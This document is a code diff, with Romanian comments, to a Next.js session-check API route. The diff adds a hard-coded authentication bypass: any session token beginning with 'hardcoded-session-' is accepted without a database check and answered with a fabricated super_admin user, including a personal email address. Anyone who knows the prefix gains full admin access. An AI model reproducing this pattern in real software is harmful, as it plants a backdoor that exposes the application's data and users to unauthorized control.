@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { supabase } from '../../../../../lib/supabase';
+import { supabase } from '@/lib/supabase';
 
 export async function GET(request: NextRequest) {
   try {
@@ -7,6 +7,25 @@ export async function GET(request: NextRequest) {
 
     if (!sessionToken) {
       return NextResponse.json({ authenticated: false }, { status: 401 });
+    }
+
+    // Verificare pentru sesiunea hard-codată
+    if (sessionToken.startsWith('hardcoded-session-')) {
+      const adminUser = {
+        id: 'hardcoded-admin-id',
+        email: 'ctgc.pn@gmail.com',
+        nume: 'Admin',
+        prenume: 'CTGC',
+        rol: 'super_admin',
+        activ: true,
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString()
+      };
+
+      return NextResponse.json({
+        authenticated: true,
+        user: adminUser
+      });
     }
 
     // Verificăm sesiunea în baza de date
